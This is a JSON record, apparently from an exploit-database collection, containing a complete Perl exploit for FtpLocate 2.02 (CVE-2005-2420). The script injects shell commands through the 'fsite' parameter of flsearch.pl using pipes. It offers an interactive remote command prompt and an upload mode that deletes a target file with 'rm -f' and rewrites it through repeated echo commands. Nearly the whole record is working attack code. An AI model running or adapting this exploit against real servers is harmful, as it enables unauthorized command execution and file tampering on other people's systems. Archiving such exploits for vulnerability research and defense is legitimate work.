{
  "id": "1120",
  "title": "FtpLocate 2.02 - &#039;current&#039; Remote Command Execution",
  "cve": "CVE-2005-2420",
  "vuln_type": "path_traversal",
  "code": "## Alot of code for a cgi | vuln. \r\n# /str0ke\r\n\r\n#!/usr/bin/perl\r\n#\r\n# FtpLocate <= 2.02 (current) remote exploit\r\n# VERY PRIVATE VERSION\r\n# DO NOT DISTRIBUTE\r\n#\r\n# newbug Tseng [at] chroot.org\r\n#\r\n\r\nsub my_socket\r\n{\r\n       my $s=IO::Socket::INET->new(PeerAddr => $host,\r\n                               PeerPort => 80,\r\n                               Proto => \"tcp\") or die \"socket: \";\r\n}\r\nsub ch2hex\r\n{\r\n       $chr = $_[0];\r\n       $out=\"\";\r\n       for($i=0;$i<length($chr);$i++)\r\n       {\r\n               $ch = substr($chr,$i,1);\r\n\r\n               if($ch eq \"\\\"\")\r\n               {\r\n                       $out.=\"%5c%22\";\r\n               }\r\n\r\n               elsif($ch eq \"\\$\")\r\n               {\r\n                       $out.=\"%5c%24\";\r\n               }\r\n               elsif($ch eq \"\\@\")\r\n               {\r\n                       $out.=\"%5c%40\";\r\n               }\r\n               else\r\n               {\r\n                       $out.=\"%\".sprintf(\"%2.2x\",ord($ch));\r\n               }\r\n       }\r\n       $out;\r\n}\r\nsub upload_file\r\n{\r\n       print \"local file: \";\r\n       chomp($lfile = <STDIN>);\r\n       print \"remote file: \";\r\n       chomp($rfile = <STDIN>);\r\n\r\n       my $socket = &my_socket($host);\r\n       print $socket \"GET $cgi?query=xx\\&fsite=|rm%20-f%20$rfile| $junk\";\r\n       close $socket;\r\n       print \"remove $host:$rfile done.\\n\";\r\n\r\n       my @DATA = `cat $lfile`;\r\n       $num=1;\r\n       $total = scalar @DATA;\r\n       foreach $DATA (@DATA)\r\n       {\r\n               $DATA = &ch2hex($DATA);\r\n               my $socket = &my_socket($host);\r\n               print $socket \"GET $cgi?query=xx\\&fsite=|echo%20\\\"$DATA\\\"%20>>$rfile| $junk\";\r\n               print \"Send lfile \\\"$lfile\\\" to $host:$rfile ... ($num/$total)\\n\";\r\n               sleep(1);\r\n               close $socket;\r\n               $num++;\r\n       }\r\n}\r\nuse IO::Socket::INET;\r\n\r\nprint \"FtpLocate flsearch.pl remote exploit\\n\";\r\nprint \"host: \";\r\nchomp ($host = <STDIN>);\r\nprint \"port (80): \";\r\nchomp ($port = <STDIN>);\r\nif($port eq \"\")\r\n{\r\n       $port = 80;\r\n}\r\nprint \"version 1.0/1.1 (1.0): \";\r\nchomp ($ver = <STDIN>);\r\nif($ver eq \"\")\r\n{\r\n       $ver = \"1.0\";\r\n}\r\nprint \"cmd/upload (cmd): \";                                                     chomp ($opt = <STDIN>);\r\nif($opt eq \"\")                                                                  {\r\n       $opt = \"cmd\";\r\n}\r\nprint \"cgi path (/cgi-bin/ftplocate/flsearch.pl): \";\r\nchomp ($cgi = <STDIN>);\r\nif($cgi eq \"\")\r\n{\r\n       $cgi = \"/cgi-bin/ftplocate/flsearch.pl\";\r\n}\r\nif($ver eq \"1.0\")\r\n{\r\n       $junk = \"HTTP/1.0\\n\\n\";\r\n}\r\nelse\r\n{\r\n       $junk = \"HTTP/1.1\\nHost: $host\\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624 Netscape/7.1\\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1\\nAccept-Language: zh-tw,en-us;q=0.7,en;q=0.3\\nAccept-Encoding: gzip,deflate\\nAccept-Charset: Big5,utf-8;q=0.7,*;q=0.7\\nKeep-Alive: 300\\nConnection: keep-alive\\n\\n\";                                        }\r\nif($opt eq \"cmd\")\r\n{\r\n       while(1){\r\n               print \"h4ck3r\\@[$host]:~\\$ \";\r\n               chomp ($cmd = <STDIN>);\r\n               if($cmd ne \"\")\r\n               {\r\n                       print \"Send command \\\"$cmd\\\" to $host ...\\n\";\r\n                       $socket = &my_socket($host);\r\n                       $cmd =~ s/\\s/%20/g;\r\n\r\n                       print $socket \"GET $cgi?query=xx\\&fsite=|$cmd| $junk\";\r\n                       print \"done.\\n\";\r\n               }\r\n       }\r\n}\r\nelsif($opt eq \"upload\")\r\n{\r\n       &upload_file($lfile);\r\n}\r\n\tprint \"done.\\n\";\r\n\r\n# milw0rm.com [2005-07-25]",
  "url": "https://www.exploit-db.com/exploits/1120"
}